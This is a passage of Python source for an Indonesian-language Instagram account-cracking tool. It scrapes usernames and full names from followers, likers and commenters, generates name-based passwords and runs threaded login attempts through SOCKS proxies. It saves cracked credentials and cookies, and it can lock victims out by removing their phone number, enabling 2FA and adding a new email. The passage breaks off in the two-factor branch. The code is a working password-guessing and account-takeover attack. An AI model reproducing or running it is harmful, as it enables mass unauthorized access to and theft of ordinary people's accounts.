                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Silahkan Masukan Username Akun Instagram Target Pastikan Tidak Terkunci Dan Centang Biru Anda Juga Bisa Menggunakan Koma Untuk Dump Masal, Misalnya :[italic green] partner.hmei3,partner.hmei7[italic white] *Gunakan[italic red] CTRL + C[italic white] Untuk Berhenti!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Catatan) [bold green]<[bold yellow]<[bold red]<"", subtitle = ""╭─────"", subtitle_align = ""left""))
                username = Console().input(""[bold grey50]   ╰─> "")
                for self.username in username.split(','):
                    uid = Requ().Convert_Name(self.username, cookie)
                try: self.Dump_Following(uid, cookie, '')
                except (Exception) as e: pass
                if len(dump) < 50:
                    Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]Jumlah Username Terlalu Sedikit Anda Harus Mencari Target Yang Lain Dan Pastikan Username Yang Terkumpul lebih Dari 50 Username!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Jumlah Terlalu Sedikit) [bold green]<[bold yellow]<[bold red]<""))
                    exit()
                else:
                    Console(width = 65).print(Panel(f'{len(dump)}',title='[bold red]>[bold yellow]>[bold green]>[bold grey50] (Jumlah Username) [bold green]<[bold yellow]<[bold red]<',style='bold grey50'),justify='center')
                    self.Methode()
            except (Exception) as e:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                exit()
                
        elif query == '03' or query == '3':
            try:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Silahkan Masukan Username Akun Instagram Target Pastikan Tidak Terkunci Dan Centang Biru Anda Juga Bisa Menggunakan Koma Untuk Dump Masal, Misalnya :[italic green] partner.hmei3,partner.hmei7[italic white] *Gunakan[italic red] CTRL + C[italic white] Untuk Berhenti!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Catatan) [bold green]<[bold yellow]<[bold red]<"", subtitle = ""╭─────"", subtitle_align = ""left""))
                username = Console().input(""[bold grey50]   ╰─> "")
                for self.username in username.split(','):
                    try: self.Dump_Search(self.username, cookie)
                    except (Exception) as e: pass
                if len(dump) < 50:
                    Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]Jumlah Username Terlalu Sedikit Anda Harus Mencari Target Yang Lain Dan Pastikan Username Yang Terkumpul lebih Dari 50 Username!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Jumlah Terlalu Sedikit) [bold green]<[bold yellow]<[bold red]<""))
                    exit()
                else:
                    Console(width = 65).print(Panel(f'{len(dump)}',title='[bold red]>[bold yellow]>[bold green]>[bold grey50] (Jumlah Username) [bold green]<[bold yellow]<[bold red]<',style='bold grey50'),justify='center')
                    self.Methode()
            except (Exception) as e:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                exit()
                
        elif query == '04' or query == '4':
            try:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Silahkan Masukan Url Postingan Akun Instagram Target Pastikan Tidak Terkunci Dan Centang Biru Anda Juga Bisa Menggunakan Koma Untuk Dump Masal, *Gunakan[italic red] CTRL + C[italic white] Untuk Berhenti!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Catatan) [bold green]<[bold yellow]<[bold red]<"", subtitle = ""╭─────"", subtitle_align = ""left""))
                username = Console().input(""[bold grey50]   ╰─> "")
                for self.username in username.split(','):
                    uid = Requ().Convert_Url(self.username, cookie)
                try: self.Dump_Komentar(uid, cookie, '')
                except (Exception) as e: pass
                if len(dump) < 50:
                    Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]Jumlah Username Terlalu Sedikit Anda Harus Mencari Target Yang Lain Dan Pastikan Username Yang Terkumpul lebih Dari 50 Username!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Jumlah Terlalu Sedikit) [bold green]<[bold yellow]<[bold red]<""))
                    exit()
                else:
                    Console(width = 65).print(Panel(f'{len(dump)}',title='[bold red]>[bold yellow]>[bold green]>[bold grey50] (Jumlah Username) [bold green]<[bold yellow]<[bold red]<',style='bold grey50'),justify='center')
                    self.Methode()
            except (Exception) as e:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                exit()
                
        elif query == '05' or query == '5':
            try:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Silahkan Masukan Url Postingan Akun Instagram Target Pastikan Tidak Terkunci Dan Centang Biru Anda Juga Bisa Menggunakan Koma Untuk Dump Masal, *Gunakan[italic red] CTRL + C[italic white] Untuk Berhenti!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Catatan) [bold green]<[bold yellow]<[bold red]<"", subtitle = ""╭─────"", subtitle_align = ""left""))
                username = Console().input(""[bold grey50]   ╰─> "")
                for self.username in username.split(','):
                    uid = Requ().Convert_Url(self.username, cookie)
                try: self.Dump_Likers(uid, cookie, '')
                except (Exception) as e: pass
                if len(dump) < 50:
                    Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]Jumlah Username Terlalu Sedikit Anda Harus Mencari Target Yang Lain Dan Pastikan Username Yang Terkumpul lebih Dari 50 Username!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Jumlah Terlalu Sedikit) [bold green]<[bold yellow]<[bold red]<""))
                    exit()
                else:
                    Console(width = 65).print(Panel(f'{len(dump)}',title='[bold red]>[bold yellow]>[bold green]>[bold grey50] (Jumlah Username) [bold green]<[bold yellow]<[bold red]<',style='bold grey50'),justify='center')
                    self.Methode()
            except (Exception) as e:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                exit()
                
        elif query == '06' or query == '6':
            try:
                Console(width=65).print(Panel('[bold green]01[bold white]. Chek Result OK\n[bold green]02[bold white]. Chek Result 2F\n[bold green]03[bold white]. Chek Result CP',style='bold grey50'), justify='center')
                choose = Console().input(""[bold grey50]   ╰─> "")
                if choose =='01' or choose =='1':
                    try:
                        file = os.listdir('/sdcard/OK')
                    except (Exception) as e:
                        Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                        exit()
                    Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic green]{str(file)}"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (File OK) [bold green]<[bold yellow]<[bold red]<""))
                    Console(width=65).print(Panel('[bold white]Chek File OK, Masukan Nama File, Misalnya : [bold green]OK-18-Maret-2024[bold white]',style='bold grey50' ,subtitle = ""╭─────"", subtitle_align = ""left""))
                    files = Console().input(""[bold grey50]   ╰─> "")
                    self.Result(choose,files)
                    exit()
                elif choose =='02' or choose =='2':
                    try:
                        file = os.listdir('/sdcard/2F')
                    except (Exception) as e:
                        Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                        exit()
                    Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(file)}"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (File 2F) [bold green]<[bold yellow]<[bold red]<""))
                    Console(width=65).print(Panel('[bold white]Chek File 2F, Masukan Nama File, Misalnya : [bold red]2F-18-Maret-2024[bold white]',style='bold grey50' ,subtitle = ""╭─────"", subtitle_align = ""left""))
                    files = Console().input(""[bold grey50]   ╰─> "")
                    self.Result(choose,files)
                    exit()
                elif choose =='03' or choose =='3':
                    try:
                        file = os.listdir('/sdcard/CP')
                    except (Exception) as e:
                        Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                        exit()
                    Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic yellow]{str(file)}"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (File CP) [bold green]<[bold yellow]<[bold red]<""))
                    Console(width=65).print(Panel('[bold white]Chek File CP, Masukan Nama File, Misalnya : [bold yellow]CP-18-Maret-2024[bold white]',style='bold grey50' ,subtitle = ""╭─────"", subtitle_align = ""left""))
                    files = Console().input(""[bold grey50]   ╰─> "")
                    self.Result(choose,files)
                    exit()
                else:
                    Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]Pilihan Yang Kamu Masukan Tidak Ada Di Dalam Menu Instagram!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                    exit()   
            except (Exception) as e:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                exit()
                
        elif query == '07' or query == '7':
            try: Facebook()
            except (Exception) as e:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                exit()
                              
        elif query == '00' or query == '0':
            try: self.Remove_Cookie()
            except (Exception) as e:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                exit()
        else:
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]Pilihan Yang Kamu Masukan Tidak Ada Di Dalam Menu Instagram!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
            exit()               
                  
    def Dump_Search(self, username, cookie):
        with requests.Session() as r:
            try:
                response = r.get(f'https://i.instagram.com/api/v1/web/search/topsearch/?context=blended&query={self.username}&rank_token=0.11856792192547738&include_reel=true',headers={'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3','x-csrftoken': re.search('csrftoken=(.*?);',cookie).group(1)}, cookies={'cookie':cookie}).json()
                for akun in response['users']:
                    if akun not in dump:
                        dump.append(akun['user']['username']+'<=>'+akun['user']['full_name'])
                        Console().print(f""[bold grey50]   ╰─>[bold green] Dump @{str(self.username)[:20]}/{len(dump)} Username...     "", end='\r')
                if 'next_max_id' in str(response):
                    self.Dump_Search(self.username, cookie)
            except (KeyboardInterrupt, requests.exceptions.TooManyRedirects) as e: pass       
            
    def Dump_Followers(self, username, cookie, max_id):
        with requests.Session() as r:
            try:
                params = {'count': '200','max_id': max_id,'search_surface': 'follow_list_page'}
                response = r.get(f'https://www.instagram.com/api/v1/friendships/{username}/followers/', params = params, headers = {'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3','x-csrftoken': re.search('csrftoken=(.*?);',cookie).group(1)}, cookies={'cookie': cookie}).json()
                for akun in response['users']:
                    if akun not in dump:
                        dump.append(akun['username']+'<=>'+akun['full_name'])
                        Console().print(f""[bold grey50]   ╰─>[bold green] Dump @{str(username)[:20]}/{len(dump)} Username...     "", end='\r')
                if 'next_max_id' in str(response):
                    self.Dump_Followers(username, cookie, response['next_max_id'])
            except (KeyboardInterrupt, requests.exceptions.TooManyRedirects) as e: pass   
            
    def Dump_Following(self, username, cookie, max_id):
        with requests.Session() as r:
            try:
                params = {'count': '200','max_id': max_id,'search_surface': 'follow_list_page'}
                response = r.get(f'https://www.instagram.com/api/v1/friendships/{username}/following/', params = params, headers = {'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3','x-csrftoken': re.search('csrftoken=(.*?);',cookie).group(1)}, cookies={'cookie': cookie}).json()
                for akun in response['users']:
                    if akun not in dump:
                        dump.append(akun['username']+'<=>'+akun['full_name'])
                        Console().print(f""[bold grey50]   ╰─>[bold green] Dump @{str(username)[:20]}/{len(dump)} Username...     "", end='\r')
                if 'next_max_id' in str(response):
                    self.Dump_Following(username, cookie, response['next_max_id'])
            except (KeyboardInterrupt, requests.exceptions.TooManyRedirects) as e: pass   
            
    def Dump_Komentar(self, username, cookie, max_min):
        with requests.Session() as r:
            try:
                params = {'can_support_threading':True,'permalink_enabled':False,'min_id': max_min}
                response = r.get(f'https://www.instagram.com/api/v1/media/{username}/comments/', params = params, headers = {'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3','x-csrftoken': re.search('csrftoken=(.*?);',cookie).group(1)}, cookies={'cookie': cookie}).json()
                for akun in response['comments']:
                    if akun not in dump:
                        dump.append(akun['user']['username']+'<=>'+akun['user']['full_name'])
                        Console().print(f""[bold grey50]   ╰─>[bold green] Dump @{str(username)[:20]}/{len(dump)} Username...     "", end='\r')
                if 'next_min_id' in str(response):
                    self.Dump_Komentar(username, cookie, response['next_min_id'])
            except (KeyboardInterrupt, requests.exceptions.TooManyRedirects) as e: pass
            
    def Dump_Likers(self, username, cookie, max_min):
        with requests.Session() as r:
            try:
                params = {'can_support_threading':True,'permalink_enabled':False,'min_id': max_min}
                response = r.get(f'https://www.instagram.com/api/v1/media/{username}/likers/', params = params, headers = {'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3','x-csrftoken': re.search('csrftoken=(.*?);',cookie).group(1)}, cookies={'cookie': cookie}).json()
                for akun in response['users']:
                    if akun not in dump:
                        dump.append(akun['username']+'<=>'+akun['full_name'])
                        Console().print(f""[bold grey50]   ╰─>[bold green] Dump @{str(username)[:20]}/{len(dump)} Username...     "", end='\r')
                if 'next_min_id' in str(response):
                    self.Dump_Komentar(username, cookie, response['next_min_id'])
            except (KeyboardInterrupt, requests.exceptions.TooManyRedirects) as e: pass   
            
    def Result(self, result, isi):
        if result in ('1','01'):
            for buka in open(f'/sdcard/OK/'+str(isi)).readlines():
                try: tree = Tree(f'\r╭ logged in user',style='green'); true = tree.add(f""Succes logged {buka.split('|')[0]}""); true.add(f""Username {buka.split('|')[1]}""); true.add(f""Password {buka.split('|')[2]}""); true = tree.add(f'\r╭ informasi date profiles',style='green'); true.add(f""Followerd {buka.split('|')[3]}""); true.add(f""Following {buka.split('|')[4]}""); true.add(f""Postingan {buka.split('|')[5]}""); true = tree.add(f'\r╭ auth secure account',style='green'); true.add(f""status two {buka.split('|')[6]}""); true.add(f""secret key {buka.split('|')[7]}""); true.add(f""pemulihan {buka.split('|')[8]}""); true.add(f""telephone {buka.split('|')[9]}""); true.add(f""add email {buka.split('|')[10]}""); true.add(f""web email {buka.split('|')[11]}""); true = tree.add(f""Cookie {buka.split('|')[12]}""); tree.add(""Success cek in Result OK""); printz(tree)
                except Exception: tree = Tree(f'\r╭ logged in user',style='green'); true = tree.add(f""Succes logged {buka.split('|')[0]}""); true.add(f""Username {buka.split('|')[1]}""); true.add(f""Password {buka.split('|')[2]}""); true = tree.add(f'\r╭ informasi date profiles',style='green'); true.add(f""Followerd {buka.split('|')[3]}""); true.add(f""Following {buka.split('|')[4]}""); true.add(f""Postingan {buka.split('|')[5]}""); true = tree.add(f""Cookie {buka.split('|')[6]}""); tree.add(""Success cek in Result OK""); printz(tree)
                    
        elif result in ('2','02'):
            for buka in open(f'/sdcard/2F/'+str(isi)).readlines():
                try: tree = Tree(f'\r╭ logged in two factor',style='red'); true = tree.add(f""Gagal logged {buka.split('|')[0]}""); true.add(f""Username {buka.split('|')[1]}""); true.add(f""Password {buka.split('|')[2]}""); true = tree.add(f'\r╭ informasi date profiles',style='red'); true.add(f""Followerd {buka.split('|')[3]}""); true.add(f""Following {buka.split('|')[4]}""); true.add(f""Postingan {buka.split('|')[5]}""); tree.add(""Success cek in Result 2F""); printz(tree)
                except Exception: tree = Tree(f'\r╭ logged in two factor',style='red'); true = tree.add(f""Gagal logged {buka.split('|')[0]}""); true.add(f""Username {buka.split('|')[1]}""); true.add(f""Password {buka.split('|')[2]}""); tree.add(""Success cek in Result 2F""); printz(tree)
                
        elif result in ('3','03'):
            for buka in open(f'/sdcard/CP/'+str(isi)).readlines():
                try: tree = Tree(f'\r╭ logged in checkpoint',style='yellow'); true = tree.add(f""Gagal logged {buka.split('|')[0]}""); true.add(f""Username {buka.split('|')[1]}""); true.add(f""Password {buka.split('|')[2]}""); true = tree.add(f'\r╭ informasi date profiles',style='yellow'); true.add(f""Followerd {buka.split('|')[3]}""); true.add(f""Following {buka.split('|')[4]}""); true.add(f""Postingan {buka.split('|')[5]}""); tree.add(""Success cek in Result CP""); printz(tree)
                except Exception: tree = Tree(f'\r╭ logged in checkpoint',style='yellow'); true = tree.add(f""Succes logged {buka.split('|')[0]}""); true.add(f""Username {buka.split('|')[1]}""); true.add(f""Password {buka.split('|')[2]}""); tree.add(""Success cek in Result CP""); printz(tree)   
            
    def Methode(self):
        try:
            self.Meterans.append(Panel(f'[bold green]01.[bold white] Methode [bold green]Api V1\n[bold green]02.[bold white] Methode [bold green]Api Threads', title='[bold red]>[bold yellow]>[bold green]>[bold grey50] (Url Api) [bold green]<[bold yellow]<[bold red]<',width = 32, style='bold grey50', subtitle = ""╭─────"", subtitle_align = ""left""))
            self.Meterans.append(Panel(f'[bold green]03.[bold white] Methode [bold green]Ajax V1\n[bold green]04.[bold white] Methode [bold green]Ajax Threads', title='[bold red]>[bold yellow]>[bold green]>[bold grey50] (Url Ajax) [bold green]<[bold yellow]<[bold red]<',width = 32, style='bold grey50'))
            Console().print(Columns(self.Meterans))
            Methode_Login = Console().input(""[bold grey50]   ╰─> "")
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Apakah Anda Ingin Menggunakan Auto Amankan Data Akun OK (y/t)"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Secure Akun) [bold green]<[bold yellow]<[bold red]<"", subtitle = ""╭─────"", subtitle_align = ""left""))
            Secure_Akun = Console().input(""[bold grey50]   ╰─> "")
            if Secure_Akun =='y' or Secure_Akun =='ya':
                self.amankan_akun.append('ya')
            self.Exec_Methode(Methode_Login)
        except (Exception) as e:
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
            exit()                
        
    def Simpan_Result(self):
        self.waktu = datetime.datetime.now()
        self.bulan = ['Januari', 'Februari', 'Maret', 'April',  'Mei', 'Juni', 'Juli','Agustus', 'September', 'Oktober', 'November', 'Desember']
        return(f'OK-{self.waktu.day}-{self.bulan[self.waktu.month-1]}-{self.waktu.year}', f'2F-{self.waktu.day}-{self.bulan[self.waktu.month-1]}-{self.waktu.year}',f'CP-{self.waktu.day}-{self.bulan[self.waktu.month-1]}-{self.waktu.year}')
        
    def Password(self, fullname):
        self.one = []
        for nama in fullname.split(' '):
            nama = nama.lower()
            if len(nama) <3: continue
            elif len(nama) == 3 or len(nama) == 4 or len(nama) == 5: self.one.append(fullname.lower()); self.one.append(fullname.replace(' ','')); self.one.append(nama+'123'); self.one.append(nama+'1234'); self.one.append(nama+'12345')
            else: self.one.append(fullname.lower()); self.one.append(fullname.replace(' ','')); self.one.append(nama+'123'); self.one.append(nama+'1234'); self.one.append(nama+'12345')
        
    def Exec_Methode(self, Methode_Login):
        try:
            self.result_ok,self.result_two,self.result_cp = self.Simpan_Result()
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[bold green]•[bold white] Result OK Tersimpan Di Folder : [bold green]/sdcard/OK/{self.result_ok}\n[bold red]•[bold white] Result 2F Tersimpan Di Folder : [bold red]/sdcard/2F/{self.result_two}\n[bold green]•[bold white] Result CP Tersimpan Di Folder : [bold yellow]/sdcard/CP/{self.result_cp}"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Result Instagram) [bold green]<[bold yellow]<[bold red]<""))
            Console(width = 65).print(Panel('[bold white]Mainkan Mode Pesawat Setiap 200 Looping Agar Terhindar Spam!',title='[bold red]>[bold yellow]>[bold green]>[bold grey50] (Warning Spam) [bold green]<[bold yellow]<[bold red]<',style='white'))
            with ThreadPoolExecutor(max_workers=30) as V:
                for Username_And_Fullname in dump:
                    username, fullname = Username_And_Fullname.split('<=>')
                    password = self.Password(fullname)
                    if Methode_Login in ('1'):
                        V.submit(self.ExecApi, username,password)
                    elif Methode_Login in ('2'):
                        V.submit(self.ExecApi_Threads, username,password)
                    elif Methode_Login in ('3'):
                        V.submit(self.ExecAjax, username,password)
                    elif Methode_Login in ('4'):
                        V.submit(self.ExecAjax_Threads, username,password)
                    else: V.submit(self.ExecApi, username,password)
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Selamat Kamu Telah Mendapatkan [bold green]{self.success}[bold white] Hasil OK, [bold yellow]{self.chekpoint}[bold white] Hasil Checkpoint Dan [bold red]{self.faktor}[bold white] Hasil Two Faktor, Dari {len(dump)} Username!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Selesai) [bold green]<[bold yellow]<[bold red]<""))
            exit()
        except (Exception) as e:
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
            exit()  
        
    def ExecApi(self, username, password):
        byps = requests.Session()
        try: Console().print(f""[bold grey50]   ──>[bold white] Crack[bold green] {str(username)[:15]}[bold grey50]/[bold white]{'{:.0%}'.format(self.looping/float(len(dump)))}[bold grey50]/[bold white]{str(len(dump))}[bold grey50]/[bold white]{self.looping}[bold grey50]/[bold white] OK:-[bold green]{self.success}[bold white] CP:-[bold red]{self.chekpoint}[bold white] 2F:-[bold red]{self.faktor}[bold white]     "", end='\r')
        except (ZeroDivisionError) as e:
            Console().print(f""[bold grey50]   ──>[bold red] {str(e).upper()}!"", end='\r')
            time.sleep(3.5)
        while True:
            try:
                data = {'signed_body': '7b589ee94c17a18ac2ea9a5247069f1d5f631ba9a37fae36429f10be5dddccfa.{""id"":""{str(str(uuid.uuid4()))}"",""server_config_retrieval"":""1"",""experiments"": ""ig_android_account_switching,ig_android_upsell_fullname,ig_android_one_click_in_old_flow,ig_android_landing_page_fb_button,ig_fbns_push,ig_android_split_username_reg,ig_android_separate_avatar_upload,ig_android_contact_point_triage,ig_fbns_blocked,ig_android_re_enable_login_button,ig_android_phone_tab_on_left""}','ig_sig_key_version': '4'}
                curl = byps.get('https://i.instagram.com/api/v1/qe/sync/', data = data, allow_redirects=True)
                headers = {
                    'x-ig-bandwidth-totalbytes-b': str(random.randint(5000000, 90000000)),
                    'x-ig-app-locale': 'in_ID',
                    'x-ig-bandwidth-speed-kbps': str(random.randint(2500000, 3000000) / 1000),
                    'x-ig-device-locale': 'in_ID',
                    'x-ig-mapped-locale': 'id_ID',
                    'x-pigeon-rawclienttime': '{:.6f}'.format(time.time()),
                    'x-ig-bandwidth-totaltime-ms': str(random.randint(2000, 9000)),
                    'x-bloks-version-id': '8ca96ca267e30c02cf90888d91eeff09627f0e3fd2bd9df472278c9a6c022cbb',
                    'x-ig-timezone-offset': str(-time.timezone),
                    'x-ig-connection-type': 'MOBILE(LTE)',
                    'x-ig-capabilities': random.choice(['Fw==','3brTv10=','3brTvw8=','3brTvwM=']),
                    'x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-0',
                    'x-ig-app-id': '567067343352427',
                    'priority': 'u=3',
                    'user-agent': Useragent().useragent_api(),
                    'accept-language': 'id-ID, en-US',
                    'x-bloks-is-layout-rtl': 'false',
                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'Host': 'i.instagram.com',
                    'x-fb-http-engine': 'Liger',
                    'x-fb-client-ip': 'True',
                    'x-fb-server-cluster': 'True',
                    'x-fb-connection-type': 'MOBILE.LTE',
                    'connection': 'keep-alive',
                    'cookie': ("";"").join([ ""%s=%s"" % (key, value) for key, value in byps.cookies.get_dict().items() ])
                }
                break
            except (requests.exceptions.ConnectionError):
                Console().print(f""[bold grey50]   ──>[bold red] KONEKSI ERROR!"", end='\r')
                time.sleep(5)
                self.ExecApi(username, password)
            except (Exception) as e:
                Console().print(f""[bold grey50]   ──>[bold red] {str(e).upper()}!"", end='\r')
                time.sleep(3.5)
                self.ExecApi(username, password)
        for passwd in password:
            try:
                hash = hashlib.md5()
                hash.update(username.encode('utf-8') + passwd.encode('utf-8'))
                hex_ = hash.hexdigest()
                hash.update(hex_.encode('utf-8') + '12345'.encode('utf-8'))          
                payload = json.dumps({
                    'phone_id': str(uuid.uuid4()),
                    '_csrftoken': curl.cookies.get('csrftoken',None),
                    'username': username,
                    'guid': str(uuid.uuid4()),
                    'device_id': 'android-'+str(uuid.uuid4()),
                    'enc_password': Requre().enc_password(passwd),
                    'login_attempt_count': '0',
                    }
                )    
                encode = (f'signed_body=7b589ee94c17a18ac2ea9a5247069f1d5f631ba9a37fae36429f10be5dddccfa.'+urllib.parse.quote(payload)+'&ig_sig_key_version=4')
                proxs = {'http': 'socks5://'+random.choice(Requ().Socksku())}
                response = byps.post('https://i.instagram.com/api/v1/accounts/login/', data = encode, headers = headers, proxies = proxs, allow_redirects=True).text
                self.result_ok, self.result_two, self.result_cp = self.Simpan_Result()
                if 'logged_in_user' in str(response):
                    self.success+=1
                    try: cookie = (';'.join(['%s=%s'%(name, value) for name, value in byps.cookies.get_dict().items()]))
                    except (Exception) as e: cookie = (None)
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    if 'ya' in self.amankan_akun:
                        try:
                            #RePassd  = Require().RePassword(passwd, ''.join(str(random.choice('abcdefghij@kdddez_-sess_-trrffrdd')) for i in range(8)), cookie)
                            #OnRd = f'{passwd}' if RePassd is None else f'{RePassd}'
                            num = Require().DeltPhone(cookie)
                            statp, pone = num['Dihapus'], num['Number']
                            deleted = f'{pone} Di Hapus' if statp is True else f'{pone} Tidak Di Hapus'
                            two = Require().Aktifkan2F(cookie)
                            kode, key, statf = two['kode-pemulihan'], two['SecretKey'], two['success-a2f']
                            stat2fa = 'Di Aktifkan' if statf is not False else 'Tidak Aktif'
                            Temp = Require().AddMail(cookie)
                            email, state, inbx = Temp['email'], Temp['di-konfirmasi'], Temp['Url']
                            statd = 'Di Konfirmasi' if state is True else 'Tidak Di Konfirmasi'
                            tree = Tree(f'\r╭ logged in user',style='green')
                            true = tree.add(f'Succes logged {fullname}')
                            true.add(f'Username {username}')
                            true.add(f'Password {passwd}')
                            true = tree.add(f'\r╭ informasi profiles',style='green')
                            true.add(f'Followers {follower}')
                            true.add(f'Following {followed}')
                            true.add(f'Postingan {feedpost}')
                            true = tree.add(f'\r╭ auth secure account',style='green')
                            true.add(f'stats two {stat2fa}')
                            true.add(f'screetkey {key}')
                            true.add(f'pemulihan {kode}')  
                            true.add(f'telephone {deleted}')   
                            true.add(f'add email {email} {statd}')
                            true.add(f'web email {inbx}')
                            tree.add(f'Cookie {cookie}')
                            printz(tree)
                            save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{stat2fa}|{key}|{kode}|{deleted}|{email} {statd}|{inbx}|{cookie}\n'
                        except Exception as e:
                            print(e)
                            tree = Tree(f'\r╭ logged in user',style='green')
                            true = tree.add(f'Succes logged {fullname}')
                            true.add(f'Username {username}')
                            true.add(f'Password {passwd}')
                            true = tree.add(f'\r╭ informasi profiles',style='green')
                            true.add(f'Followers {follower}')
                            true.add(f'Following {followed}')
                            true.add(f'Postingan {feedpost}')
                            tree.add(f'Cookie {cookie}')
                            printz(tree)
                            save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{cookie}\n'
                    else:
                        tree = Tree(f'\r╭ logged in user',style='green')
                        true = tree.add(f'Succes logged {fullname}')
                        true.add(f'Username {username}')
                        true.add(f'Password {passwd}')
                        true = tree.add(f'\r╭ informasi profiles',style='green')
                        true.add(f'Followers {follower}')
                        true.add(f'Following {followed}')
                        true.add(f'Postingan {feedpost}')
                        tree.add(f'Cookie {cookie}')
                        printz(tree)
                        save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{cookie}\n'
                    with open('/sdcard/OK/'+self.result_ok,'a') as wr:
                        wr.write(save)
                        wr.close()
                    break       
                elif 'two_factor_required' in str(response):
